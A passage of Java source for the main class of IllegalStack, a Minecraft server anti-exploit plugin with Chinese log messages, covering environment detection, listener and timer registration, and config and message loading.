package main.java.me.dniym;

import main.java.me.dniym.commands.IllegalStackCommand;
import main.java.me.dniym.enums.Msg;
import main.java.me.dniym.enums.Protections;
import main.java.me.dniym.enums.ServerVersion;
import main.java.me.dniym.listeners.Listener113;
import main.java.me.dniym.listeners.Listener114;
import main.java.me.dniym.listeners.Listener116;
import main.java.me.dniym.listeners.ProtectionListener;
import main.java.me.dniym.listeners.fListener;
import main.java.me.dniym.listeners.mcMMOListener;
import main.java.me.dniym.listeners.pLisbListener;
import main.java.me.dniym.timers.fTimer;
import main.java.me.dniym.timers.sTimer;
import main.java.me.dniym.timers.syncTimer;
import main.java.me.dniym.utils.Scheduler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Chunk;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.World;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerTeleportEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

// ---------- 新增导入 ----------
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.logging.Handler;
import java.util.logging.LogRecord;
// ---------------------------

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;

// ---------- 新增导入（用于数据包操作）----------
import java.io.FileWriter;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.logging.Level;
// ---------------------------------------------

public class IllegalStack extends JavaPlugin implements Listener {

    private static final Logger LOGGER = LogManager.getLogger("IllegalStack/" + IllegalStack.class.getSimpleName());

    private static IllegalStack plugin;
    private static Plugin ProCosmetics = null;
    private static boolean isHybridEnvironment = false;
    private static boolean isPaperServer = false;
    private static boolean isFoliaServer = false;
    private static boolean hasProtocolLib = false;
    private static boolean hasAttribAPI = false;
    private static boolean nbtAPI = false;
    private static boolean SlimeFun = false;
    private static boolean EpicRename = false;
    private static boolean ClueScrolls = false;
    private static boolean Spigot = false;
    private static boolean blockMetaData = false;
    private static boolean hasFactionGUI = false;
    private static boolean SmartInv = false;
    private static boolean SavageFac = false;
    private static boolean CMI = false;
    private static boolean hasMCMMO = false;
    private static boolean hasTraders = false;
    private static boolean hasChestedAnimals = false;
    private static boolean hasContainers = false;
    private static boolean hasShulkers = false;
    private static boolean hasAsyncScheduler = false;
    private static boolean hasElytra = false;
    private static boolean hasMagicPlugin = false;
    private static boolean disablePaperShulkerCheck = false;
    private static boolean hasUnbreakable = false;
    private static boolean hasStorage = false;
    private static boolean hasIds = false;
    private static Material lbBlock = null;

    private static String version = "";
    private Scheduler.ScheduledTask ScanTimer = null;
    private Scheduler.ScheduledTask SignTimer = null;
    private Scheduler.ScheduledTask syncTimer = null;
//	private static NMSEntityVillager nmsTrader= null;

    private ServerVersion serverVersion;

    // ---------- 自定义边界相关 ----------
    private static final double HARD_LIMIT = 30_000_000D;
    private static final String CONFIG_WORLDS = "worlds";

    // ---------- 反作弊配置路径 ----------
    private static final String CONFIG_ANTICHEAT_ANTI4D4V = "anticheat.anti4d4v";
    private static final String CONFIG_ANTICHEAT_BANBBQ = "anticheat.banBBQ";

    // ---------- 日志查看器相关 ----------
    private final Set<Player> logViewers = ConcurrentHashMap.newKeySet();
    private Handler logHandler;

    // ---------- 调试模式和静默崩溃配置 ----------
    private static final String CONFIG_DEBUG_MODE = "debug-mode";
    private static final String CONFIG_SILENT_CRASH_MODE = "silent-crash-mode";

    public static IllegalStack getPlugin() {
        return plugin;
    }

    public void setPlugin(IllegalStack plugin) {
        IllegalStack.plugin = plugin;
    }

    public static boolean isIsHybridEnvironment() {
        return isHybridEnvironment;
    }

    public static boolean isPaperServer() {
        return isPaperServer;
    }

    public static boolean isSpigot() {
        return Spigot;
    }

    public static boolean isFoliaServer() {
        return isFoliaServer;
    }

    public static boolean isCMI() {
        return CMI;
    }

    public static void setCMI(boolean cMI) {
        CMI = cMI;
    }

    public static void ReloadConfig(Boolean wasCommand) {
        if (!wasCommand) {
            IllegalStack.getPlugin().writeConfig();
        }

        IllegalStack.getPlugin().updateConfig();
        IllegalStack.getPlugin().loadConfig();
        IllegalStack.getPlugin().loadMsgs();
        StartupPlugin();
    }

    private static void checkForHybridEnvironment() {
        try {
            Class.forName("io.izzel.arclight.i18n.ArclightConfig");
            isHybridEnvironment = true;
            LOGGER.info("服务器为 ArcLight 混合环境，启用混合调度器检查。");
        } catch (ClassNotFoundException e) {
            isHybridEnvironment = false;
            LOGGER.info("服务器不是 ArcLight 混合环境，继续正常模式。");
        }

        if (!isIsHybridEnvironment()) {
            try {
                Class.forName("net.minecraftforge.fml.ModList");
                isHybridEnvironment = true;
                LOGGER.info("服务器为 Forge 混合环境，启用混合调度器检查。");

            } catch (ClassNotFoundException e) {
                isHybridEnvironment = false;
                LOGGER.info("服务器不是 Forge 混合环境，继续正常模式。");
            }
        }

        if (!isIsHybridEnvironment()) {
            try {
                Class.forName("net.fabricmc.loader.api.FabricLoader");
                isHybridEnvironment = true;
                LOGGER.info("服务器为 Fabric 混合环境，启用混合调度器检查。");
            } catch (ClassNotFoundException e) {
                isHybridEnvironment = false;
                LOGGER.info("服务器不是 Fabric 混合环境，继续正常模式。");
            }
        }
    }

    private static void checkForPaperServer() {
        try {
            Class.forName("com.destroystokyo.paper.utils.PaperPluginLogger");
            isPaperServer = true;
            LOGGER.info("服务器为 Paper 服务器，启用 Paper 特性。");
        } catch (ClassNotFoundException e) {
            isPaperServer = false;
            LOGGER.info("服务器不是 Paper 服务器，继续正常模式。");
        }
    }

    private static void checkForFoliaServer() {
        try {
            Class.forName("io.papermc.paper.threadedregions.RegionizedServer");
            isFoliaServer = true;
            LOGGER.info("服务器包含 Folia 组件，启用 Folia 特性。");
        } catch (ClassNotFoundException e) {
            isFoliaServer = false;
            LOGGER.info("服务器不包含 Folia 组件，继续正常模式。");
        }
    }

    private static void StartupPlugin() {

        checkForHybridEnvironment();
        checkForPaperServer();
        checkForFoliaServer();

        try {
            Class.forName("org.spigotmc.SpigotConfig");
            Spigot = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("服务器不是 Spigot，禁用聊天组件。");
        }

        if (plugin.getServer().getPluginManager().getPlugin("Logblock") != null) {
            File conf = new File(Bukkit.getPluginManager().getPlugin("Logblock").getDataFolder(), "config.yml");
            final FileConfiguration lbconfig = YamlConfiguration.loadConfiguration(conf);

            if (lbconfig != null) {
                setLbBlock(Material.matchMaterial(lbconfig.getString("tools.toolblock.item")));
                LOGGER.info("检测到 Logblock 插件，若工具方块物品被列入黑名单，将不会移除：" + getLbBlock().name());
            }
        }
        if (plugin.getServer().getPluginManager().getPlugin("CMI") != null) {
            CMI = true;
            if (Protections.BlockCMIShulkerStacking.isEnabled()) {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，IllegalStack 将阻止在按住 Shift 并右键点击背包中的潜影盒时嵌套潜影盒的行为！");
            } else {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，但配置中的 BlockCMIShulkerStacking 设置为 FALSE，因此玩家可以使用 CMI 将潜影盒放入潜影盒中！要启用此防护，请在 config.yml 中添加 BlockCMIShulkerStacking: true。");
            }
        }

        Protections.runReflectionChecks();

        if (fListener.getInstance() == null) {
            plugin.getServer().getPluginManager().registerEvents(new fListener(plugin), plugin);
        }
        if (Protections.RemoveOverstackedItems.isEnabled()) {
            if (plugin.ScanTimer == null) {
                Scheduler.runTaskTimerAsynchronously(plugin, new fTimer(plugin), 10, 10);
                Scheduler.runTaskTimer(plugin, new syncTimer(plugin), 10l, 10l);
            }

        } else {
            if (plugin.ScanTimer != null) {
                plugin.ScanTimer.cancel();
            }
            if (plugin.syncTimer != null) {
                plugin.syncTimer.cancel();
            }
        }

        if (Protections.RemoveBooksNotMatchingCharset.isEnabled() && !fListener.getInstance().is113() && !fListener.is18()) {
            if (plugin.SignTimer == null) {
                Scheduler.runTaskTimerAsynchronously(plugin, new sTimer(), 10, 10);
            }
        } else {
            if (plugin.SignTimer != null) {
                plugin.SignTimer.cancel();
            }
        }

        if (fListener.getInstance().isAtLeast113()) {
            new Listener113(IllegalStack.getPlugin());
        }

        if (fListener.getInstance().isAtLeast114()) {
            new Listener114(IllegalStack.getPlugin());
            LOGGER.info(
                    "僵尸村民转化几率设置为 {} *** 仅在难度为困难时真正生效 ***",
                    Protections.ZombieVillagerTransformChance.getIntValue()
            );
        }

        if ((fListener.getInstance().getIs116()) || fListener.getInstance().isIs117()) {
            new Listener116(IllegalStack.getPlugin());
        }
    }

    public static boolean isEpicRename() {
        return EpicRename;
    }

    public static void setEpicRename(boolean epicRename) {
        EpicRename = epicRename;
    }

    public static boolean isSlimeFun() {
        return SlimeFun;
    }

    public static void setSlimeFun(boolean slimeFun) {
        SlimeFun = slimeFun;
    }

    public static String getVersion() {
        return version;
    }

    public static boolean isNbtAPI() {
        return nbtAPI;
    }

    public static void setNbtAPI(boolean nbtAPI) {
        IllegalStack.nbtAPI = nbtAPI;
    }

    public static boolean isHasAttribAPI() {
        return hasAttribAPI;
    }

    public static void setHasAttribAPI(boolean hasAttribAPI) {
        IllegalStack.hasAttribAPI = hasAttribAPI;
    }

    public static boolean isClueScrolls() {
        return ClueScrolls;
    }

    public static void setClueScrolls(boolean clueScrolls) {
        ClueScrolls = clueScrolls;
    }

    public static Plugin getProCosmetics() {
        return ProCosmetics;
    }

    public static void setProCosmetics(Plugin proCosmetics) {
        ProCosmetics = proCosmetics;
    }

    public static boolean isHasMCMMO() {
        return hasMCMMO;
    }

    public static void setHasMCMMO(boolean hasMCMMO) {
        IllegalStack.hasMCMMO = hasMCMMO;
    }

    public static boolean hasFactionGUI() {
        return hasFactionGUI;
    }

    public static void setHasFactionGUI(boolean hasFactionGUI) {
        IllegalStack.hasFactionGUI = hasFactionGUI;
    }

    public static boolean hasContainers() {
        return hasContainers;
    }

    public static boolean hasChestedAnimals() {
        return hasChestedAnimals;
    }

    public static boolean hasProtocolLib() {
        return hasProtocolLib;
    }

    public static void setHasProtocolLib(boolean hasProtocolLib) {
        IllegalStack.hasProtocolLib = hasProtocolLib;
    }

    public static boolean isHasMagicPlugin() {
        return hasMagicPlugin;
    }

    public static void setHasMagicPlugin(boolean hasMagicPlugin) {
        IllegalStack.hasMagicPlugin = hasMagicPlugin;
    }

    public static boolean isBlockMetaData() {
        return blockMetaData;
    }

    public static void setBlockMetaData(boolean blockMetaData) {
        IllegalStack.blockMetaData = blockMetaData;
    }

    public static boolean hasTraders() {
        return hasTraders;
    }

    @NotNull
    public static String getString(String version) {
        if (version.equalsIgnoreCase("v1_14_R1")) {

            version = IllegalStack.getPlugin().getServer().getVersion().split(" ")[2];

            version = version.replace(")", "");
            version = version.replace(".", "_");
            String[] ver = version.split("_");
            version = "v" + ver[0] + "_" + ver[1] + "_R" + ver[2];
        }
        return version;
    }

    public static boolean hasSmartInv() {
        return SmartInv;
    }

    public static void setSmartInv(boolean smartInv) {
        SmartInv = smartInv;
    }

    public static boolean hasSavageFac() {
        return SavageFac;
    }

    public static void setSavageFac(boolean savageFac) {
        SavageFac = savageFac;
    }

    public static boolean hasIds() {
        return hasIds;
    }

    public static boolean hasAsyncScheduler() {
        return hasAsyncScheduler;
    }

    public static boolean hasShulkers() {
        return hasShulkers;
    }

    public static boolean hasElytra() {
        return hasElytra;
    }

    public static boolean hasUnbreakable() {
        return hasUnbreakable;
    }

    public static boolean isDisablePaperShulkerCheck() {
        return disablePaperShulkerCheck;
    }

    public static void setDisablePaperShulkerCheck(boolean disablePaperShulkerCheck) {
        IllegalStack.disablePaperShulkerCheck = disablePaperShulkerCheck;
    }

    public static boolean hasStorage() {
        return hasStorage;
    }

    @Override
    public void onEnable() {

//    	 new EntityRegistry(this);
        this.setPlugin(this);
        setVersion();
        loadConfig();
        updateConfig();
        loadMsgs();
        checkForHybridEnvironment();
        checkForPaperServer();
        checkForFoliaServer();
        IllegalStackCommand illegalStackCommand = new IllegalStackCommand();
        this.getCommand("istack").setExecutor(illegalStackCommand);
        this.getCommand("istack").setTabCompleter(illegalStackCommand);

        // ---------- 注册 /serverchat 命令 ----------
        ServerChatCommand serverChatCommand = new ServerChatCommand();
        if (this.getCommand("serverchat") != null) {
            this.getCommand("serverchat").setExecutor(serverChatCommand);
            this.getCommand("serverchat").setTabCompleter(serverChatCommand);
        } else {
            getLogger().warning("命令 /serverchat 未在 plugin.yml 中定义，注册失败！");
        }
        // -----------------------------------------

        // ---------- 注册 /admin 命令 ----------
        AdminCommand adminCommand = new AdminCommand();
        if (this.getCommand("admin") != null) {
            this.getCommand("admin").setExecutor(adminCommand);
            this.getCommand("admin").setTabCompleter(adminCommand);
        } else {
            getLogger().warning("命令 /admin 未在 plugin.yml 中定义，注册失败！");
        }
        // -----------------------------------------

        // ---------- 注册自定义边界监听器和反作弊监听器 ----------
        getServer().getPluginManager().registerEvents(this, this);
        // -----------------------------------------

        ProCosmetics = this.getServer().getPluginManager().getPlugin("ProCosmetics");

        if (this.getServer().getPluginManager().getPlugin("EpicRename") != null) {
            EpicRename = true;
        }

        if (this.getServer().getPluginManager().getPlugin("ClueScrolls") != null) {
            setClueScrolls(true);
        }

        setHasChestedAnimals();
        setHasContainers();
        setHasTraders();
        setHasShulkers();
        setHasAsyncScheduler();
        setHasElytra();
        setHasUnbreakable();
        setHasStorage();

        try {
            Class.forName("com.github.stefvanschie.inventoryframework.Gui");
            LOGGER.info("发现使用 InventoryFramework 的插件，这些物品在其 GUI 内将被列入白名单。");
            setHasFactionGUI(true);
        } catch (ClassNotFoundException ignored) {
        }

        ItemStack test = new ItemStack(Material.DIAMOND_AXE, 1);
        ItemMeta im = test.getItemMeta();

        try {
            im.getAttributeModifiers();
            setHasAttribAPI(true);

        } catch (NoSuchMethodError e) {
            setHasAttribAPI(false);
        }

        try {
            Class.forName("net.md_5.bungee.api.chat.ComponentBuilder");
            LOGGER.info("找到聊天组件！在 /istack 中启用可点击命令。");
            Spigot = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("未找到 Spigot 聊天组件！禁用聊天组件。");
        }

        try {
            Class.forName("fr.minuskube.inv.content.InventoryProvider");
            setSavageFac(true);

        } catch (ClassNotFoundException ignored) {

        }
        try {
            Class.forName("fr.minuskube.inv.SmartInventory");
            setSmartInv(true);

        } catch (ClassNotFoundException ignored) {

        }

        try {
            Class.forName("org.bukkit.inventory.meta.BlockDataMeta");
            blockMetaData = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("未找到 Spigot 聊天组件！禁用聊天组件。");
        }

        if (plugin.getServer().getPluginManager().getPlugin("Logblock") != null) {
            File conf = new File(Bukkit.getPluginManager().getPlugin("Logblock").getDataFolder(), "config.yml");
            final FileConfiguration lbconfig = YamlConfiguration.loadConfiguration(conf);

            if (lbconfig != null) {
                setLbBlock(Material.matchMaterial(lbconfig.getString("tools.toolblock.item")));
                LOGGER.info("检测到 Logblock 插件，若工具方块物品被列入黑名单，将不会移除：" + getLbBlock().name());
            }
        }

        if (this.getServer().getPluginManager().getPlugin("CMI") != null) {
            CMI = true;
            if (Protections.BlockCMIShulkerStacking.isEnabled()) {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，IllegalStack 将阻止在按住 Shift 并右键点击背包中的潜影盒时嵌套潜影盒的行为！");
            } else {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，但配置中的 BlockCMIShulkerStacking 设置为 FALSE，因此玩家可以使用 CMI 将潜影盒放入潜影盒中！要启用此防护，请在 config.yml 中添加 BlockCMIShulkerStacking: true。");
            }
        }

        if (this
                                .getServer()
                                .getPluginManager()
                                .getPlugin("ProtocolLib") != null && Protections.BlockBadItemsFromCreativeTab.isEnabled()) {
            LOGGER.info(
                    "检测到 ProtocolLib，已启用创造模式物品栏漏洞检测。注意：仅当您的服务器有普通（非 OP）玩家可以使用 /gmc 时才需要开启此防护。");
            new pLisbListener(this);
        }

        if (this.getServer().getPluginManager().getPlugin("ProtocolLib") == null && Protections.DisableChestsOnMobs.isEnabled()) {

            LOGGER.warn(
                    "未找到 ProtocolLib！！！！且 DisableChestsOnMobs 防护已开启。玩家仍有可能使用作弊客户端通过马/驴在服务器上进行复制。强烈建议您安装 ProtocolLib 以获得最佳防护！");

        } else if (Protections.DisableChestsOnMobs.isEnabled()) {
            new pLisbListener(this);
            setHasProtocolLib(true);
        }

        this.getServer().getPluginManager().registerEvents(new fListener(this), this);

        if (!fListener.is18()) {
            this.getServer().getPluginManager().registerEvents(new ProtectionListener(this), this);
        }

        if (Protections.RemoveOverstackedItems.isEnabled() || Protections.PreventVibratingBlocks.isEnabled()) {
            ScanTimer = Scheduler.runTaskTimerAsynchronously(
                    this,
                    new fTimer(this),
                    Protections.ItemScanTimer.getIntValue(),
                    Protections.ItemScanTimer.getIntValue()
            );
            syncTimer = Scheduler.runTaskTimer(this, new syncTimer(this), 10, 10);
        }

        if (Protections.RemoveBooksNotMatchingCharset.isEnabled() && !fListener.getInstance().is113() && !fListener.is18()) {
            SignTimer = Scheduler.runTaskTimerAsynchronously(this, new sTimer(), 10, 10);
        }
        if ((fListener.getInstance().isAtLeast113())) {
            new Listener113(this);
        }
        if (fListener.getInstance().isAtLeast114()) {
            new Listener114(this);
            LOGGER.info(
                    "僵尸村民转化几率设置为 {} *** 仅在难度为困难时真正生效 ***",
                    Protections.ZombieVillagerTransformChance.getIntValue()
            );
        }

        if (this.getServer().getPluginManager().getPlugin("Magic") != null) {
            setHasMagicPlugin(true);
        }

        if (this.getServer().getPluginManager().getPlugin("mcMMO") != null) {
            this.getServer().getPluginManager().registerEvents(new mcMMOListener(this), this);
            setHasMCMMO(true);
        }

        setNbtAPI((this.getServer().getPluginManager().getPlugin("NBTAPI") != null));
        if (!isNbtAPI() && Protections.DestroyInvalidShulkers.isEnabled()) {
            LOGGER.warn(
                    "DestroyInvalidShulkers 防护已开启，但此防护需要使用 NBTApi 2.0+，如果您希望使用此功能，请安装该插件：https://www.spigotmc.org/resources/nbt-api.7939/");
        }
        if (this.getServer().getPluginManager().getPlugin("Slimefun") != null) {
            SlimeFun = true;
        }

        if ((fListener.getInstance().getIs116())) {
            new Listener116(IllegalStack.getPlugin());
        }

        // 初始化反作弊配置（如果不存在则设置默认值）
        getConfig().addDefault(CONFIG_ANTICHEAT_ANTI4D4V, false);
        getConfig().addDefault(CONFIG_ANTICHEAT_BANBBQ, false);
        getConfig().addDefault(CONFIG_DEBUG_MODE, false);
        getConfig().addDefault(CONFIG_SILENT_CRASH_MODE, false);
        getConfig().options().copyDefaults(true);
        saveConfig();
    }

    // ---------- 调试模式 getter/setter ----------
    public boolean isDebugMode() {
        return getConfig().getBoolean(CONFIG_DEBUG_MODE, false);
    }

    public void setDebugMode(boolean enabled) {
        getConfig().set(CONFIG_DEBUG_MODE, enabled);
        saveConfig();
    }

    public boolean isSilentCrashMode() {
        return getConfig().getBoolean(CONFIG_SILENT_CRASH_MODE, false);
    }

    public void setSilentCrashMode(boolean enabled) {
        getConfig().set(CONFIG_SILENT_CRASH_MODE, enabled);
        saveConfig();
    }

    private void setHasTraders() {
        try {
            Class.forName("import org.bukkit.entity.TraderLlama");
            hasTraders = true;
        } catch (ClassNotFoundException ignored) {

        }
    }

    private void setHasStorage() {
        Inventory inv = Bukkit.getServer().createInventory(null, 9);
        try {
            inv.getStorageContents();
            hasStorage = true;
        } catch (NoSuchMethodError ignored) {
        }
    }

    private void setHasUnbreakable() {
        ItemStack is = new ItemStack(Material.DIRT);
        ItemMeta im = is.getItemMeta();
        try {
            im.setUnbreakable(false);
            hasUnbreakable = true;

        } catch (NoSuchMethodError ignored) {
        }
    }

    private void setHasElytra() {

        Material m = Material.matchMaterial("Elytra");
        if (m != null) {
            hasElytra = true;
        }
    }

    private void setHasIds() {
        ItemStack is = new ItemStack(Material.BEDROCK);
        try {
            is.getType().getId();
            hasIds = true;
        } catch (IllegalArgumentException ignored) {
        }
    }

    private void setHasShulkers() {
        try {

            Class.forName("org.bukkit.block.ShulkerBox");
            hasShulkers = true;
        } catch (ClassNotFoundException ignored) {

        }
    }

    private void setHasContainers() {
        try {
            Class.forName("org.bukkit.block.Container");
            hasContainers = true;

        } catch (ClassNotFoundException ignored) {

        }
    }

    private void setHasAsyncScheduler() {
        try {
            Class.forName("org.bukkit.Server.getAsyncScheduler");
            hasAsyncScheduler = true;
        } catch (ClassNotFoundException ignored) {

        }
    }

    private void setHasChestedAnimals() {

        try {
            Class.forName("org.bukkit.entity.ChestedHorse");
            hasChestedAnimals = true;
        } catch (ClassNotFoundException ignored) {
        }
    }

    private void updateConfig() {
        File conf = new File(getDataFolder(), "config.yml");
        FileConfiguration config = this.getConfig();
        HashMap<String, Object> added = new HashMap<>();

        for (Protections p : Protections.values()) {
            if (!p.getCommand().isEmpty()) {
                continue;
            }
            if (p.isRelevantToVersion(getVersion())) {
                if (config.getString(p.getConfigPath()) == null) {
                    if (p.getConfigValue() instanceof Boolean) {
                        p.setEnabled((Boolean) p.getDefaultValue());
                    }
                    added.put(p.getConfigPath(), p.getDefaultValue());
                }
                for (Protections child : p.getChildren()) {
                    if (config.getString(child.getConfigPath()) == null) {

                        if (child.getConfigValue() instanceof Boolean) {
                            child.setEnabled((Boolean) child.getDefaultValue());
                        }
                        added.put(child.getConfigPath(), child.getDefaultValue());
                    }
                }
            } else if (config.getString(p.getConfigPath()) != null) {
                if (p.getVersion().isEmpty()) // handling a child node
                {
                    Protections parent = Protections.getParentByChild(p);
                    if (parent == null || !parent.isRelevantToVersion(getVersion())) {
                        added.put(p.getConfigPath(), null);
                    }
                } else {
                    added.put(p.getConfigPath(), null);
                    for (Protections child : p.getChildren()) {
                        added.put(child.getConfigPath(), null);
                    }
                }
            }
        }

        boolean updated = false;
        if (config.getString("UserRequested.Obscure.HackedShulker.RemoveOnChunkLoad") != null) {
            config.set("UserRequested.Obscure.HackedShulker.RemoveOnChunkLoad", null);
        }
        if (config.getString("Exploits.Enchants.AllowOpBypass") != null) {
            config.set("Exploits.Enchants.AllowOpBypass", null);
        }

        for (String key : added.keySet()) {
            if (added.get(key) == null) {
                LOGGER.info(
                        "发现一个不再使用或不适用于当前服务器版本的旧配置值：{} 已从配置中移除。",
                        key
                );
                config.set(key, null);
            } else {
                LOGGER.info(
                        "发现缺少配置值 {}，已使用默认值 {} 添加到配置中。",
                        key,
                        added.get(key)
                );
                config.set(key, added.get(key));
                Protections p = Protections.findByConfig(key);
                if (p != null && (added.get(key) instanceof Boolean)) {
                    p.setEnabled((Boolean) added.get(key));
                }
                if (p == Protections.AlsoPreventHeadInside && Material.matchMaterial("COMPOSTER") != null) {
                    Protections.AlsoPreventHeadInside.addTxtSet("COMPOSTER", null);
                }
            }
            updated = true;
        }

        if (updated) {
            try {
                config.save(conf);
            } catch (IOException e1) {

                // TODO Auto-generated catch block
                LOGGER.error("更新配置失败！", e1);
            }
        }
    }

    private void loadMsgs() {
        File conf = new File(getDataFolder(), "messages.yml");
        YamlConfiguration fc = new YamlConfiguration();
        try {
            fc.load(conf);
        } catch (FileNotFoundException e) {
            LOGGER.info("正在创建 messages.yml");
            for (Msg m : Msg.values()) {
                if (fc.getString(m.name()) == null) {
                    LOGGER.info("正在为 {} 向 messages.yml 添加默认消息", m.name());
                    fc.set(m.name(), m.getConfigVal());
                }
            }
            try {
                fc.save(conf);
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } catch (IOException | InvalidConfigurationException e) {
            e.printStackTrace();
        }

        if (fc != null) {
            boolean update = false;
            for (Msg m : Msg.values()) {
                if (fc.getString(m.name()) == null) {
                    LOGGER.info(
                            " {} 在 messages.yml 中缺失，已使用默认值 {} 添加",
                            m.name(),
                            m.getConfigVal()
                    );
                    fc.set(m.name(), m.getConfigVal());
                    update = true;
                }

                m.setValue(fc.getString(m.name()));
            }
            if (update) {

                try {
                    fc.save("plugins/IllegalStack/messages.yml");
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    }

    private void loadConfig() {
        File conf = new File(getDataFolder(), "config.yml");
        try {
            plugin.getConfig().load(conf);
        } catch (FileNotFoundException e) {
            LOGGER.error(
                    "未找到配置文件！/plugins/IllegalStack/config.yml - 正在创建带有默认值的新配置文件。");
            FileConfiguration config = this.getConfig();
            try {
                config.save(conf);
            } catch (IOException e1) {
                // TODO Auto-generated catch block
                LOGGER.error("保存配置失败？", e1);
            }
            writeConfig();
        } catch (IOException | InvalidConfigurationException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        if (getConfig().getString("ConfigVersion") == null) { // server is running an old config
            // version, should probably save it.
            File confOld = new File(getDataFolder(), "config.OLD");
            FileConfiguration config = this.getConfig();

            conf.renameTo(confOld);

            try {
                config.set("Settings", null);
                config.save(conf);
            } catch (IOException e1) {
                // TODO Auto-generated catch block
                e1.printStackTrace();
            }
            LOGGER.warn(
                    "您正在从旧版本升级，抱歉，我们需要重新生成您的 Config.yml 文件。您的旧设置已保存在 /plugins/IllegalStack/config.OLD 中。");
            try {
                conf.createNewFile();
                writeConfig();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        Protections.update();

        StringBuilder whitelisted = new StringBuilder();

        for (String s : Protections.NetherWhiteList.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }

        if (whitelisted.length() > 0) {
            String mode = "允许";
            if (!Protections.NetherWhiteListMode.isEnabled()) {
                mode = "不允许";
            }

            LOGGER.info("以下实体（按名称）{} 通过下界传送门：{}", mode, whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.EndWhiteList.getTxtSet()) // this.getConfig().getStringList("Settings.EndWhiteList"))
        {
            whitelisted.append(" ").append(s);
        }

        if (whitelisted.length() > 0) {
            String mode = "允许";
            if (!Protections.EndWhiteListMode.isEnabled()) {
                mode = "不允许";
            }
            LOGGER.info("以下实体（按名称）{} 通过末地传送门：{}", mode, whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.NotifyInsteadOfBlockExploits.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }

        if (whitelisted.length() > 0) {
            LOGGER.warn(
                    "警告：对于以下漏洞，IllegalStack 将不会阻止，而是进行通知：{}",
                    whitelisted
            );
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.DisableInWorlds.getTxtSet()) { // this.getConfig().getStringList("Settings.DisableInWorlds")) {
            World w = this.getServer().getWorld(s);
            if (w == null) {
                LOGGER.warn(
                        "IllegalStack 被配置为忽略世界 {} 中的所有检查，但该世界似乎并未加载……请仔细检查您的 config.yml！",
                        s
                );
            }

            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.warn("IllegalStack 将不会在以下世界进行任何漏洞检查：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.RemoveItemTypes.getTxtSet()) {
            Material m = null;
            if (s.equalsIgnoreCase("ENCHANTED_GOLDEN_APPLE")) {
                m = Material.matchMaterial("GOLDEN_APPLE");
                Protections.RemoveItemTypes.setNukeApples(true);
                LOGGER.info("正在移除附魔金苹果。");
                continue;
            } else {
                m = Material.matchMaterial(s);
            }
            int id = -1;
            int data = 0;

            if (m != null) {
                whitelisted.append(s).append(" ");
            } else {
                if (s.contains(":")) {
                    String[] splStr = s.split(":");

                    try {
                        id = Integer.parseInt(splStr[0]);
                        data = Integer.parseInt(splStr[1]);
                    } catch (NumberFormatException ignored) {
                    }
                }
                if (id != -1) {
                    whitelisted.append(s).append(" ");
                } else {
                    LOGGER.warn("无法找到匹配的材质：{} 请确保它是一个有效的 Minecraft 材质类型！", s);
                }
            }
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("发现以下材质将从玩家背包中移除：{}", whitelisted);
        }

        whitelisted = new StringBuilder();

        for (String s : Protections.AllowStack.getTxtSet()) // this.getConfig().getStringList("Settings.AllowStack"))
        {
            Material m = Material.matchMaterial(s);
            if (m != null) {
                whitelisted.append(s).append(" ");
            } else {
                LOGGER.warn("无法找到匹配的材质：{} 请确保它是一个有效的 Minecraft 材质类型！", s);
            }
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("以下材质允许堆叠超过原版大小：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.BookAuthorWhitelist.getTxtSet()) {
            whitelisted.append(s).append(" ");
        }
        if (whitelisted.length() > 0) {
            LOGGER.info(
                    "以下玩家可以创建不符合指定字符集的书籍（可在配置中更改！）：{}",
                    whitelisted
            );
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.ItemNamesToRemove.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("匹配以下名称的物品将从玩家背包中移除：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
